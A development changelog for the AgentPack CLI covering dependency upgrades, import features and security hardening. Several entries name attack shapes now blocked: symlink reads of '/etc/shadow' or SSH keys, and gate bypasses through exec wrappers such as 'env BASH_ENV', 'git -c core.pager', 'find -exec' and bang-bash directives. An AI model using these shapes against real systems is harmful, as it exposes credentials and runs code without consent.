# Changelog

## 0.7.0-dev — 2026-07-09 (deps wave, website doc-truth + Antigravity, sync design)

Second wave of the 2026-07-09 session — dependency triage, website copy sync, and the continuous-sync design:

- **Dependency triage (supersedes dependabot #95/#97/#98/#99/#100/#101).** Minor/patch group to latest + commander 12→15 + actions/checkout v7 (PR #106; `@types/diff` removed rather than bumped — `diff@9` bundles its own types). **zod 3→4** (PR #107): enum-keyed `compatibility.targets` → `z.partialRecord` (v4 makes enum-keyed records exhaustive — the old shape would have rejected every pack declaring only some targets), explicit key schemas on single-arg `z.record` sites, `z.email()`/`z.url()`. **tailwindcss 3→4** (this PR): official upgrade codemod — CSS-first `@theme` (custom ink/accent/risk palette preserved), `@tailwindcss/postcss`, autoprefixer dropped; verified visually (landing + docs screenshots) on top of `pnpm verify`.
- **Website copy synced to the shipped CLI (PR #108).** An independent drift sweep found the registry site frozen at the Phase 1–2 era: missing `import`/`install`/registry commands and `pack plugin|mcpb|chat`, no git-source install anywhere, a false "CLI never writes outside --out" security claim, and an `npx agentpack` quickstart that can't resolve (not on npm). All fixed; new `apps/registry/tests/docs-copy.test.ts` guards command-list parity with `packages/cli/src/commands/` and bans the stale claims (`.doc-contract` points at it — `check-doc-truth.sh` only sees markdown).
- **Antigravity documented as verified reach (PR #108).** Google Antigravity auto-loads a workspace's `AGENTS.md` + `GEMINI.md` (verified empirically against agy 1.1.0 with marker files) and reads Agent-Skills-spec `SKILL.md` folders — so the `generic` target reaches it today; README/docs/cli.md/website updated with honest ceiling language. Antigravity also ran this session's registry runtime-verification lane.
- **Continuous-sync design (PR #109, `docs/sync-design.md`).** Provenance `source` block in the lockfile, `agentpack update` with BASE/LOCAL/NEW three-way reconcile + exec re-consent on delta, `--scope user` personal-config loop, honest machine-to-web lanes, no-daemon triggers. Phases tracked as issues #110–#113, multi-pack lockfile as #114.

## 0.7.0-dev — 2026-07-09 (dogfood sweep: verbatim subagent bodies #102, zero-trace planning #103)

A full three-lane dogfood pass (CLI journey + independent Codex fresh-checkout verification + Antigravity registry runtime checks) confirmed the documented user journey end-to-end and surfaced two small fixes, both landed via PR with TDD (failing test first):

- **Markdown-sourced subagent bodies emit verbatim (#102, PR #104).** The `claude-code` adapter injected a synthetic `# <name>` H1 into every emitted subagent, so `import --from claude-code` → `install` produced agents whose system prompt differed from the source (and a body opening with its own H1 would get a second one). `resolveSubagentBody` now marks markdown-sourced instructions `verbatim`; the title is synthesized only for YAML-descriptor / description-fallback bodies. Verified: all 17 agents of a real `~/.claude` round-trip byte-identical.
- **Planning is read-only — dry-run/diff/gate-refused installs leave zero trace (#103, PR #105).** `planInstall` created `.agentpack/{installed,backups}` and staged its export inside `.agentpack/`, so `install --dry-run`, `diff`, and pre-commit refusals (exec gate, non-TTY confirm) all mutated the target project. Staging moved to `os.tmpdir()`; state dirs are now created only by `applyInstall` when an install commits. Found by the Codex verification lane; the stale empty `.agentpack/` in this repo's root was this bug's footprint.

## 0.7.0-dev — 2026-06-19 (harden: hook-script exfiltration guard resolves symlinks before containment)

- **Closed a symlink bypass of the hook-script exfiltration guard (#90 follow-up).** The guard confined the hook command's path _lexically_ to the imported tree / `~/.claude`, but then read it with a symlink-following stat — so a `.sh`-named symlink **inside** the tree could redirect the read to a file outside it (e.g. `/etc/shadow`, `~/.ssh/id_rsa`). Hook files are legitimately symlinked to a dotfiles repo, so refusing symlinks outright wasn't an option. The importer now `realpath`-resolves the target and requires the **real** path to stay inside the tree / `~/.claude` / `$HOME` **and** still carry a script extension before reading. Legit dotfiles symlinks (which resolve under `$HOME`) still bundle; a symlink escaping to a non-script or out-of-tree file is refused (warned). Two regression tests (escape blocked + legit in-tree symlink allowed); verified the real `~/.claude` still bundles all hooks. 481 core + 62 cli green. (Flagged by the automated commit security review.)

## 0.7.0-dev — 2026-06-18 (feat: bundle hook scripts so hooks travel — #90)

- **`import --from claude-code` bundles hook script bodies into the pack.** A hook atom previously carried only the command _reference_ (`$HOME/.claude/hooks/foo.sh`), so an installed hook pointed at a script that didn't exist on a fresh machine. The importer now resolves a hook command to its script file (expanding `$HOME`/`~`, following symlinks for dotfiles setups), bundles the body into `atoms/hooks/scripts/<slug><ext>`, and rewrites the command to the portable `<interpreter> ${CLAUDE_PROJECT_DIR}/.claude/hooks/<slug><ext>` form Claude Code expands (interpreter from an explicit prefix → `#!` shebang → `.sh`→`bash`; no `chmod +x` needed). On `pack export`/install the `claude-code` adapter writes the script to `.claude/hooks/` (path-contained + lockfile-hashed) and the settings.json hook points at it. Trailing args are preserved. Bundled scripts stay under the `--allow-exec` install gate (still `hook` atoms).
- **Secret hygiene + reviews.** Reads are confined to the imported config tree or `~/.claude` (an exfiltration guard — a hook command can't bundle an arbitrary file elsewhere on disk), and each bundled script emits a "full contents will ship; review before publishing" notice. Bare PATH binaries (`prettier`), unresolvable/missing paths, non-text, and no-interpreter scripts are not bundled (warned, reference kept). Independent security + code reviews (SHIP-WITH-FIXES; all findings applied — install-traversal, command-gate bypass, exec-consent, and lockfile integrity confirmed closed). 6 hook-bundle tests; 479 core + 62 cli green.

## 0.7.0-dev — 2026-06-18 (feat: import preserves agent tools/model; verbatim `.md` subagents — #91 follow-up)

- **`import --from claude-code` carries subagents as verbatim `.md`, preserving `tools`/`model`.** The importer emitted subagents as a YAML descriptor (`{id,name,instructions}`), which dropped the source agent's `tools` and `model` frontmatter. It now copies the source `agents/<name>.md` byte-for-byte into `atoms/subagents/<slug>.md` and references it, so import → export round-trips the full frontmatter. `resolveSubagentBody` lifts `tools`/`model` from a markdown agent's frontmatter and the `claude-code` adapter emits them (omitting whichever are absent). Back-compatible: a subagent atom pointing at a YAML descriptor still resolves via `instructions`. Round-trip test added (a fixture agent with `tools`/`model` survives import→export); 473 core + 62 cli green.

## 0.7.0-dev — 2026-06-18 (fix: subagent atoms carry a markdown body; enables in-place manifests)

- **Subagent atoms can reference a markdown body (frontmatter + prompt), not just a YAML descriptor.** The `claude-code` adapter resolved a subagent's system prompt only from a YAML descriptor's `instructions` field; pointing an atom at a Claude-Code-native `.claude/agents/*.md` file silently dropped the prompt and emitted an agent containing only the one-line description. A new shared `resolveSubagentBody` helper dispatches on extension: `*.md` → markdown body (with a frontmatter `description` lifted through), anything else → the existing YAML-descriptor form (back-compatible — importer-emitted packs are unchanged). This unblocks an **in-place manifest**: an `AGENTPACK.yaml` can now sit in a dotfiles/`.claude` tree and reference the real `agents/*.md`, `skills/`, and `CLAUDE.md` files where they already live — zero duplication — and still validate + cross-compile. New `subagent-body` test (markdown body + YAML descriptor back-compat); 472 core + 62 cli green.

## 0.7.0-dev — 2026-06-18 (feat: import a whole Claude Code config directory — #88)

- **`agentpack import --from claude-code <dir>` — new feature (#88).** Ingests an entire Claude Code config directory (`~/.claude`, or a project's `.claude/` + root `CLAUDE.md`) into a single pack, mirroring the existing Codex directory importer: `CLAUDE.md` → instruction/rule atoms, `skills/<name>/SKILL.md` → skill atoms, `agents/<name>.md` → subagent atoms, `commands/<name>.md` → command atoms (YAML descriptor + prompt body), and `settings.json` `hooks` / `mcpServers` → hook / mcp_server atoms (remote `url` MCPs supported alongside stdio). Previously `import` only read a single `CLAUDE.md`, so packaging a full setup meant hand-authoring the manifest. **Secret hygiene is built in:** the reader opens only the known config surfaces by name, so `.credentials.json` and runtime trees (`plugins/`, `projects/`, caches) are never touched, and MCP `env` surfaces secret **key names** only (never values). Verified live against a real `~/.claude` — 59 atoms (instructions + rules + 20 skills + 17 subagents + 9 hooks + 3 MCP servers), `validate` exit 0, no tokens in the output. New core parser/builder/IO modules (`parseClaudeCode` / `buildClaudeCodeManifest` / `importClaudeCodeDir`) + fixture + CLI dispatch; 6 core tests + 1 CLI test; 470 core + 61 cli green.

## 0.7.0-dev — 2026-06-18 (fix: install honors exports.default_profile — #86)

- **`install` no longer hardcodes the `safe` profile (#86).** `agentpack install` defaulted the profile to the literal `"safe"`, but every pack produced by `agentpack import` declares only an `all` profile (with `exports.default_profile: all`) — so the entire import→install round-trip failed out of the box with `✗ Unknown profile \`safe\``. Found by dogfooding the documented "import your context, install it fresh" flow. The CLI now passes the profile through unset and lets `exportPack`'s existing resolver pick `exports.default_profile`→ a`safe`profile → else refuse (the same resolution`plan`/`inspect`already used, which is why only`install`was affected).`planInstall`'s `profile`is now optional and the lockfile/plan record the *resolved* profile. New CLI test + fixture`default-profile-all`; 525 core+cli tests green. The remote-registry path keeps the `"safe"` prefill pending live-infra verification (signature-observed file fetch must stay consistent with the planner).

A status/versioning audit pass on the planning docs (three parallel read-only agents: versioning, plans/status, git/issue state). **Versioning came back clean** — all packages `0.7.0-dev`, CLI `--version` test-guarded against the manifest, no drift; the "v0.3.0" language is the next release _tag_ for the gated hosted registry, not the in-repo line. Two doc-truth fixes landed (PR #84):

- **ISA `Out of Scope` reconciled to present reality.** The section still listed Phases 3–7 as out-of-scope ("requires hosted infra not in this session") while the body records Phases 3–5 as code-complete through iteration-10 — a contradiction in the canonical spec. Each line now uses the existing strikethrough convention: Phase 3 (iter-4, ISC-151–267), Phase 4 (iter-9, ISC-318+), Phase 5 (git-source live) marked in-scope with their live-infra / release-promotion gates stated; Phases 6–7 remain out with gate reasons. Defers to `STATUS.md` for shipped-vs-gated state.
- **ROADMAP estimates reframed for agentic pace.** The effort table assumed solo human-developer weeks (3–5 wk/phase, ~12–19 cumulative). The tier (E3–E5) is now framed as relative complexity, not calendar time; agentic coding collapses to a few focused sessions (Phase 3+5 backend was one `/max` session), and each phase's ship date is gated by an external binding constraint (live infra, partner product, demand signal), not developer-weeks. Added a Phase-7 version-label note so `0.7.0-dev` isn't misread as "Phase 7."

Issue #63 (go-public tracker) reconciled by comment: Phases 0–2 (hardening, B1 gate, the public flip + verified anonymous quickstart) are done; Phases 3 (npm publish) and 4 (registry promotion, gated on operator infra) remain open. Docs only; `scripts/check-doc-truth.sh` OK (52 files conform).

## 0.7.0-dev — 2026-06-17 (pre-public hardening: exec-gate scope + clean-build fix)

Two findings from the final pre-public verification sweep (issues #78, #80), fixed before the visibility flip. `pnpm verify` exit 0 — **800** tests.

- **Exec-atom gate widened to a second exec surface (#78).** The B1 `--allow-exec` gate previously covered only `hook` / `mcp_server` atoms. A `command` or `subagent` atom compiles to `.claude/commands|agents/<slug>.md` with the author's prompt body written **verbatim** — so a Claude Code bang-bash directive (`` !`…` ``) in that body runs shell the moment the slash command / subagent is invoked, which the gate didn't cover. The gate now also refuses an unsigned, unverified install whose planned `.claude/commands|agents/*.md` output contains a bang-bash directive (surfaced as `execFiles` in `--json`); `--allow-exec` (independent of `--allow-critical`, never crossed by `--yes` alone) is required, and a `--require-sig`-verified install is exempt. A plain prompt command (no `` !`…` ``) is **not** gated, so the common case stays frictionless. Three new CLI tests cover refuse / `--allow-exec` proceeds / benign-command-not-gated.
- **Clean-build trap fixed (#80).** `composite: true` placed each package's `*.tsbuildinfo` at the package root, so wiping `dist/` alone left a stale incremental cache and `tsc` silently no-op'd the emit — surfacing later as a confusing `Cannot find module '@agentpack/core'` typecheck failure. Relocated `tsBuildInfoFile` into `dist/` for core/db/cli/connector so a `dist/` wipe also clears the cache, and added a `pnpm clean` script that removes every `dist/` + `*.tsbuildinfo` + `.next`.

## 0.7.0-dev — 2026-06-16 (pre-public verification pass: version-drift fix + doc-truth reconciliation)

An independent verification sweep ahead of the public visibility flip (issue #63), re-checking every "done" claim against the code and a live build rather than trusting the checklist. `pnpm verify` exit 0 — **797** tests, green after the vitest 2→4 and Sigstore 5.0 dependency bumps. The B1 executable-atom gate was re-confirmed by code review, its 7 tests, and a live E2E run (an unsigned hook pack is refused with `-y`, demands `--allow-exec`, and `--allow-exec` is independent of `--allow-critical`). Secret + brand scrubs came back clean (`.vercel/` untracked; emitters ship placeholder names only).

- **CLI version drift fixed.** `agentpack --version` reported a hardcoded `0.2.0` (stamped into generated lockfiles) while every `package.json` was already `0.7.0-dev`. Bumped `CLI_VERSION` to `0.7.0-dev` and rewrote the `--version` test to assert it equals `packages/cli/package.json`'s version, so the constant can no longer silently drift from the manifest.
- **CHANGELOG no longer claims a flip that never happened.** The `0.4.0-dev` entry asserted "AgentPack went public today / Repo flipped to PUBLIC"; the repo is still private pending the operator's one-way flip. Reworded to OSS-readiness prep with a pointer to STATUS.md.
- **ISA front-matter unfrozen.** Header was stuck at Iteration-5 / 2026-05-19 while the body runs through Iteration-10 (ISC-335); updated to match.
- **Doc version-coherence polish.** README roadmap table footnoted to explain the `0.7.0-dev` line vs the Phase 7 roadmap items; `Plans/ROADMAP.md` header notes Phases 1–5 are shipped (STATUS.md is the source of truth); `docs/signatures.md` stale "coming in v0.4.1 / v0.4.x" version pegs reworded to "planned"; `bug_report.yml` surface dropdown `workgraph` → `agentpack`.

## 0.7.0-dev — 2026-06-16 (iteration-10: review/QA sweep, hardening backlog, cross-surface build-out)

A `/max` session: a parallel review fleet (security + backend-architecture + an independent Codex second-opinion + end-to-end QA), the full pre-public hardening backlog it surfaced, and four new cross-surface compile/import targets — every change landed via its own PR with required CI gating the merge. The security review and Codex independently cleared the load-bearing invariants (Sigstore SAN-binding; install-recovery happy path); E2E QA drove every CLI atom against real packs with no functional bugs.

**Security & correctness**

- **Command-gate RCE (CRITICAL, #33).** The MCP/hook gate was a denylist that `env BASH_ENV=…`, `git -c core.pager='!cmd'`, `find -exec`, `xargs`, `make`, `ssh`, and editor `:!cmd` shapes bypassed — emitted verbatim into `.mcp.json`/settings for the host to run → arbitrary execution on `install`. Now rejects indirection/exec-wrapper basenames outright; documented that a _declared interpreter running shipped code_ is the install-consent surface, not the gate's job.
- **Install-recovery crash-time data-loss (#34).** Rollback only unlinked staged files whose hash matched, stranding partially-written _created_ files; and a swallowed backup-restore failure was recorded as success. The WAL `install_begin` now records `createdPaths`/`requiredBackups`; rollback unlinks created paths unconditionally, create-writes use temp+fsync+atomic-link, and an unrestored required backup fails loud (`result:"failed"`) instead of claiming success. Backward compatible with old entries.
- **Sign the full install artifact (#35).** The Sigstore bundle covered only the manifest, so a registry/R2 atom-byte swap with a matching hash still verified. Introduced a signed _release descriptor_ (`manifestSha256` + sorted per-file `{path,sha256,bytes,atomId}`); `install` now hashes downloaded bytes against the signed set (`artifact_mismatch` on swap). `verify --sig` enforces by default (`--sig-if-present` for the old lenient behavior); verified signatures persist to the lockfile. v1 manifest-only signatures still verify (`coverage:manifest-only`).
- **Symlink-safe pack-relative reads (CWE-59, #50).** `exportChat`/`codex`/`claudeCode` prompt-path readers rejected `..`/absolute/`~` but not symlinks — a pack could ship `leak.md → /etc/passwd` and read it into the exported artifact. Unified behind one symlink-safe `readPackRelativeFile` helper (lstat + realpath re-containment, fail-closed).
- **Registry hardening.** Orphan publish-token before user-code validation fixed (#33); concurrent same-version finalize → `409 version_exists` not 500 (#33); pack-detail `latestVersion` now semver-sorted, not lexical (#33); immediate token revocation on mutating paths + a pluggable `RateLimitStore` seam (in-memory default; durable KV is the documented prod upgrade) (#37); schema gained hot-path indexes (`publisher_members.user_id` et al.), CHECK constraints, and an atomic quarantine-status+audit transaction (#36).
- **git-source** authenticated GitHub fetches use `redirect:"error"` so a cross-origin redirect can't leak the bearer token (#33).

**Issue #25 — closed.** Registry route tests for `me`, `v1/health`, `packs` list+detail, `signatures`, `reviews`, and the `cli/auth` device flow (incl. an orphan-token regression), plus the finalize-409 path. A coverage **gate** now enforces thresholds scoped to `app/api`+`lib` (UI excluded as a brittle floor) — measured _and_ gated in CI.

**Cross-surface build-out** (see `docs/integration-roadmap.md`)

- **`import --from codex` (#39)** — Codex setup → pack, near-lossless (shared SKILL.md/MCP/hooks/subagents/AGENTS.md); round-trips back through the codex adapter.
- **`.mcpb` emitter + CoWork (#38)** — new `agentpack pack mcpb` (MCP Bundle v0.3, secrets→`user_config`) for one-click local MCP install on CoWork/Desktop; corrected the hooks portability ceiling (CoWork _does_ run plugin hooks); repositioned `pack plugin` as the CoWork + org-plugins governance path.
- **`pack chat` (#40)** — Claude Chat compile target: skill ZIPs (native + on-invoke bridges for instructions/rules/commands) + a `connectors.json` install recipe + `project-instructions.md` + a portability README.
- **`import --from chatgpt-gpt` + OpenAPI→MCP transpiler (#41)** — the "move a ChatGPT GPT to Claude Chat" path; the transpiler (operationId→MCP tool, auth→secrets/scopes) is the reusable interop primitive across Codex/Apps SDK/Claude, since MCP is the shared spine. Honest about what can't cross (no GPT export API, GPT Store, Apps widgets, managed RAG).

**Follow-up fixes** (landed after the initial cross-surface wave)

- **Isolated-workspace build ordering (#53).** Workspace package builds failed in an isolated checkout because `tsc` ran before dependency packages were built; switched to TypeScript project references so `core → db → connector → cli → registry` build in dependency order.
- **`parseClaudeMd` preamble capture (#57).** Content before the first `##` heading was dropped on import; it is now captured as a leading instruction atom (the same preamble fix the codex importer relies on), adding the missing core coverage.
- **`admin-status` route test refactor (#58).** Extracted `applyStatusChange` from the admin status route handler so the status-transition logic is unit-testable independent of the HTTP layer; the route tests now drive the extracted function directly.
- **Executable-atom install gate (B1, #63).** Installing an _unverified_ pack that ships executable atoms (`hook` / `mcp_server`, which run author-supplied code on the user's machine) now refuses unless an explicit `--allow-exec` is passed — `--yes` alone never crosses it, mirroring `--allow-critical`. A signature-verified install (`--require-sig` success) is exempt; git sources, which can't be signature-verified yet, always fall under the gate. The gate keys off the resolved atoms' real `type` (a new authoritative `InstallPlan.atomTypes`), not the forgeable `<type>:<slug>` id prefix.

Tests: `pnpm verify` exit 0 — **797** total (464 core + 57 cli + 79 db + 44 connector + 153 registry), up from 645. Deferred deeper items remain tracked in their issues where applicable (live-DB smoke for the finalize transaction body + valid-signature crypto via `scripts/smoke-e2e.sh`).

## 0.6.13-dev — 2026-06-15 (pre-public issue sweep: importer, adapters, registry routes)

Closes the open DX/correctness issues and adds the CLAUDE.md→pack importer, ahead of the public visibility flip. Every change landed via PR with required CI checks gating the merge.

- **`agentpack import` — new feature (#30).** Compile an existing CLAUDE.md/AGENTS.md into a pack (the inverse of `pack export`): each `##` section becomes an instruction atom; governance/security sections (auth/git/security/verification/definition-of-done) promote to rule atoms with `must`/`must_not` derived from bullet **and** ordered-list items. Traversal-proof writes, always-schema-valid output, `@import` directives warned + dropped. `agentpack import <path> --id <publisher.slug> [--out] [--name]` (`-` reads stdin). 30 tests; dogfooded against a real CLAUDE.md (9 atoms, `validate` clean, the Auth section yields its 6 structured rules).
- **Adapter heading hierarchy (#24).** Instruction/rule bodies opening with their own `# Title` produced a duplicate title and an H1 nested under the section header in all 5 adapters. New shared `demoteBodyHeadings` strips the redundant title when it equals the atom name, otherwise demotes the body's headings; CRLF-safe (round-trips byte-for-byte), fenced-code-immune, and a no-op for well-formed bodies so determinism holds.
- **Registry route coverage (#25, partial).** 39 tests for the network-facing auth/publish/token route gates (401/403/409/410/422, finalize-hijack guard, masked-token mint), with `requireScope` and the rate limiter exercised for real. Registry is now measured in the CI coverage chain. Route internals (live-DB transaction, valid-signature crypto) + a threshold remain — tracked in #25.
- **`none` capability alias (#23).** `permissions.shell.execution: none` / `network.access: none` are now accepted and normalized to `forbidden` at the schema boundary; `agentpack init` scaffolds the shell/network fields with the valid values.
- **Connector `serve.ts` de-flaked (#27); CI gating hardened.** The coverage push's serve tests raced a fixed timeout on CI; `main()`'s promise is now exported so tests await startup deterministically. Required status checks (`build · typecheck · lint · test`) were enabled on `master`, closing the gap that let a red commit reach the branch.

Tests: `pnpm verify` exit 0 — **645** total (374 core + 44 cli + 72 db + 44 connector + 111 registry), up from 564.

## 0.6.12-dev — 2026-06-14 (test-coverage hardening for public release)

Coverage push ahead of going public: closed the largest untested surfaces and added regression gates so the gains can't silently erode. No source behavior changed — tests + vitest config only.

- **Sigstore verification (core)** — `signing/sigstore.ts` 43→76% lines / 51→90% branch. 14 new tests (`sigstore-verify.test.ts`) pin the trust-gate paths from the iteration-9 identity-binding fix: forged-SAN rejection via the verified-cert (not the envelope), the `requireIdentity` short-circuit, and all eight `VerifyFailureReason` classifications. (The crypto boundary is mocked; the guard logic around it is exercised for real against a decoded test cert.)
- **db query layer** — `queries/{tokens,packs,publishes,publishers}.ts` 1–2%→**100%** lines; package 51→92%. 53 new tests against a recording fake-Drizzle client assert the load-bearing predicates structurally: the `revokedAt IS NULL` active-token guard, owner-scoped revoke, `status=published` filter, and semver latest-selection. New db coverage gate (lines/statements 85, branch 78).
- **connector** — `server.ts` 67→**100%**, `serve.ts` 0→**100%**; package 78→98%. 9 new tests drive the real Hono app + MCP transport and prove the auth boundary closes (401 no-token, 403 bad-Host, fail-closed start on missing/short token). New `vitest.config.ts` with a coverage gate (lines/funcs 90, branch 75) — the package previously had no config and no gate.
- **registry made measurable** — added a `test:coverage` script and wired `apps/*` into the root `test:coverage` so the network-facing app is covered in CI for the first time. Overall 6.33% lines, but the security libs are already covered (`tokens.ts` 97%, `rate-limit.ts` 96%, `audit.ts` 100%); the gap is route handlers + R2/manifest streaming. Route tests + a threshold tracked in [#25](https://github.com/jckeen/agent-pack/issues/25).
- **Fixed a test-fidelity bug** — a publisher-scope test asserted against a fictional `admin`/`member` role when the real enum is `owner|maintainer`; corrected to real roles. A fresh-context review confirmed no other instance across the new suites.

Tests: `pnpm verify` exit 0 — **564** total (336 core + 40 cli + 72 db + 44 connector + 72 registry), up from 488. New regression gates on db + connector; `cli` stays ungated because its integration tests drive the built CLI as a subprocess that in-process v8 can't instrument (a misleading 2.49%).

## 0.6.11-dev — 2026-06-13 (deferred-verify issue sweep; ISA iteration-9)

Closes the eight `[DEFERRED-VERIFY]` security/correctness issues migrated to GitHub (#14–#21) — six were already fixed in code and are now confirmed with regression tests; two needed real work; the connector gained the auth it was always missing.

- **Signer-identity enforcement (#14)** — a valid Sigstore keyless signature only proves _some_ identity signed the manifest, not the expected publisher's. New `evaluateSignerGate` (core `signing/`) pins the acceptable signer from `--expected-signer` ∪ policy `install.allowedSigners`, and policy `install.requireIdentity` refuses an unpinned signer instead of trust-on-first-use. Wired into `install --require-sig` and `verify --sig`; identity failure exits 4. The registry-side per-publisher bound-SAN remains a follow-up gated on the live registry.
- **Typed exit codes (#20)** — the CLI catch-all (`failCleanly`) mapped every uncaught error to 1. New `exitCodeForError` maps typed domain errors to the pinned taxonomy: `InstallManifestNotFoundError`/`VersionNotFoundError`/`BlobNotFoundError` → 8, `IntegrityError` → 7, `UninstallConflictError` → 9. `verify` of an uninstalled pack now exits 8. (Also fixed a copy-paste duplicate `AGENTPACK_DEBUG` guard.)
- **Connector auth (security)** — the remote-MCP connector bound with no auth. Now auth-by-default: `AGENTPACK_CONNECTOR_TOKEN` (≥16 chars) is required or the server refuses to start (fail-closed, no skip-auth branch); bearer compared in constant time; `/mcp` authenticated, `/healthz` public; DNS-rebinding Host/Origin allowlist. 4 → 33 connector tests.
- **Registry hardening** — `verifyBearer` gained a per-instance 45 s TTL cache (documented revocation-staleness window); regression tests backfilled for the already-shipped audit hash-chain fork guard (#15, advisory lock + `FOR UPDATE`) and admin CSRF/Origin guard (#16); a real schema drift fixed (`pack_signatures_signer_san_idx` existed in SQL but not the Drizzle schema object) and a drizzle-kit `meta/` journal baseline established so `db:generate` reports no drift. Registry 43 → 72 tests.
- **Verified-and-closed (#17, #18, #19, #21)** — ref control-char rejection, git-source SHA-pinning, project-wide install lock, and Windows reserved-name rejection were already implemented; each now has a named regression test cited in the issue closure.
- **Adversarial review hardening** (found by a fresh-context security + correctness pass over the diff):
  - **CRITICAL** — `verifyManifestSignature` judged the signer SAN from `envelope.metadata` (attacker-controllable JSON), so a valid bundle re-signed by any identity with the SAN string edited could pass the gate. The identity is now re-derived from the certificate **inside the cryptographically-verified bundle** and that is what the gate and the persisted metadata use; the envelope SAN is only a pre-crypto fast-fail. New `identity-binding` test proves a forged-SAN bundle is rejected.
  - `install --require-sig` now pins the signature fetch to the **resolved** version and cross-checks the signed manifest sha against the bytes on disk — a racing `latest` can't sign a different version than is installed.
  - Connector `timingSafeEqual_str` compared UTF-16 code units, not bytes (multibyte tokens could false-accept) — now byte-correct; DNS-rebinding host check is bracket-aware for `[::1]:port`.
- **Dependency advisories cleared** — `diff` 7→9, `yaml` 2.6→2.9, and a `postcss ≥8.5.10` override; `pnpm audit --prod` reports **no known vulnerabilities**.

Tests: `pnpm verify` exit 0 — **488** total (322 core + 40 cli + 19 db + 35 connector + 72 registry). New policy fields `install.allowedSigners` / `install.requireIdentity`.

## 0.6.10-dev — 2026-06-12 (doc contract; drift-sweep bootstrap)

Docs/CI-only. Every tracked markdown surface is now declared in a root `.doc-contract` (LIVING / SOURCE / HISTORICAL) and asserted in CI by a vendored `scripts/check-doc-truth.sh` (ADR 0005 in dotfiles), running as the first CI step.

- **HISTORICAL**: `spec/*.md` (the original build packet — ISA.md is the canonical spec) got point-in-time banners.
- **Shadow tracker migrated**: the 8 open `[DEFERRED-VERIFY]` checkboxes in ISA.md (ISC-289..296) became GitHub issues [#14](https://github.com/jckeen/agent-pack/issues/14)–[#21](https://github.com/jckeen/agent-pack/issues/21); ISA lines now link them. A `BANNED` guard keeps open checkboxes out of living docs.
- **Old-name drift fixed**: `Plans/ROADMAP.md` still used the pre-v0.5.1 CLI name in its Phase-6 `audit` examples; a `BANNED` regex on old-name CLI invocations prevents recurrence ("Workgraph" the separate product remains legal).
- **Checker improved** (DOC_TRUTH_VERSION=2, synced to the canonical dotfiles copy): the dead-link rule now strips fenced code blocks and inline code spans first — slug regexes like `[a-z0-9](?:…)` no longer parse as markdown links.
- Deleted the stray empty `agentpack_workgraph_build_packet/`.

## 0.6.9-dev — 2026-06-12 (Agent Skills spec conformance; ISA iteration-8)

AgentPack now provably **emits and consumes [Agent Skills](https://agentskills.io) spec-conformant skill folders** and positions itself a layer above the spec (multi-atom packs, install discipline, governance). Audited against the live spec (agentskills/agentskills `docs/specification.mdx` + `skills-ref` reference validator, commit 5d4c1fd); every emitted skill folder — example pack and an adversarial fixture, across claude-code/codex/generic exports and plugin layout — passes `skills-ref validate`.

- **Audit findings fixed** (all three skill-emitting adapters + plugin guidance skill): `: ` in a synthesized description broke the YAML frontmatter; unknown top-level frontmatter fields passed through (a spec hard error); pass-through skills could mismatch name↔directory; atom-id slugs with uppercase/`.`/`_` survived into skill directory names.
- **New spec module** `packages/core/src/skills/agentskills.ts` (exported from core): `validateSkillMdContent` (TS port of the skills-ref rules), `normalizeSkillSlug`, `renderSkillMd` (YAML-safe synthesis), `conformSkillMd` (rewrites `name` to the emitted directory, relocates non-spec fields under the spec's `metadata` passthrough, clamps over-limit fields — each change warned, never silent; conformant sources pass through byte-identical), `validateSkillAtoms` (ingestion-side check).
- **YAML-injection sweep**: new `yamlFrontmatter` helper; `.claude/commands/*.md`, `.claude/agents/*.md`, and `.cursor/rules/*.mdc` frontmatter now serialize through the YAML library instead of string interpolation.
- **Ingestion**: a `skill` atom can wrap any spec-conformant skill folder and it round-trips byte-identical; `agentpack validate` now reports non-conformant skill sources as `skills.spec` warnings.
- **Codex fix**: AGENTS.md skill index and the command/skill collision rename now share one slug computation — the index can no longer point at a pre-rename path.
- **CI conformance gate**: `packages/core/tests/agentskills-conformance.test.ts` (32 tests, incl. adversarial fixtures) validates every emitted SKILL.md against the spec rules on each run (TS re-implementation; tradeoff vs the Python validator noted in the test header).

Tests: core 272 → 304; `pnpm verify` exit 0.

## 0.6.8-dev — 2026-06-12 (reposition to governance + reach; ISA iteration-7)

Docs-only. Repositions the project from "write once, install anywhere" to **the compiler and governance layer for agent configuration**, and documents the now-shipped cross-surface story honestly.

- **README** leads with the two real problems (no discipline / no reach) and the durable moat (policy + lockfile + risk + provenance), with portability as supporting. New **"Where a pack runs — across Claude's surfaces"** section: the local-install / plugin / connector vehicle table + the per-atom portability-ceiling table, and the blunt truth that hooks and ambient `CLAUDE.md` are terminal-only. Adds `pack plugin` and the connector to the quickstart, CLI highlights, and repo layout; status line refreshed to 2026-06-12.
- **STATUS.md** gains an Iteration-7 highlights section and a refreshed header.
- **ISA.md** adds the **Iteration-7** section (ISC-301..312) recording the cross-surface emit + connector + portability work and the security/usability/registry hardening, plus the iteration decisions (honesty over reach-theater; plugin via relocation; connector hosting deferred; reposition rationale).

No code change; `pnpm verify` unaffected (378 tests green as of 0.6.7).

New `@agentpack/connector` package: a thin **remote MCP server** that exposes a pack's portable guidance to **every** Claude surface at once — claude.ai web, Desktop, Cowork, and mobile/Dispatch — including the pure-chat/mobile surfaces a plugin can't reach. This is the second half of the cross-surface story: the plugin (`pack plugin`) covers plugin-aware surfaces; the connector covers the long tail.

- **`catalog.ts`** (pure, tested): reshapes `skill`/`command`/`instruction`/`rule`/`subagent` atoms into MCP **prompts** (invokable) + **resources** (readable). `hook` and `mcp_server` atoms are explicitly NOT carried (no MCP equivalent / already their own server), each with a stated reason. MCP cannot make anything _ambient_ the way `CLAUDE.md` is in Code — prompts are invoked, not auto-loaded. Honest by construction.
- **`server.ts`**: an `McpServer` (current `registerPrompt`/`registerResource`/`registerTool` API, verified against `@modelcontextprotocol/sdk@1.29.0`) served over Hono + Web Standard Streamable HTTP (stateless), plus a `pack_info` tool and a `/healthz` probe.
- **`agentpack-connector <pack>`** launcher. Live-verified: `/healthz` + an MCP `initialize` round-trip (advertises prompts/resources/tools capabilities); 5 prompts / 6 resources from `examples/pr-quality`.
- New `@agentpack/core` exports: `readAtomFile`, `readAtomDirectory`.

**Prototype, no auth.** The README documents the bearer-auth (MCP resource-server pattern), DNS-rebinding protection, and hosting steps required before public exposure. Recurring hosted infra is **deferred** per cost policy — the deploy path is documented, not provisioned.

Tests: connector 4; `pnpm verify` exit 0 (connector now in the build + coverage pipeline).

---

## 0.6.6-dev — 2026-06-12 (Directory-plugin emit path + portability ceilings)

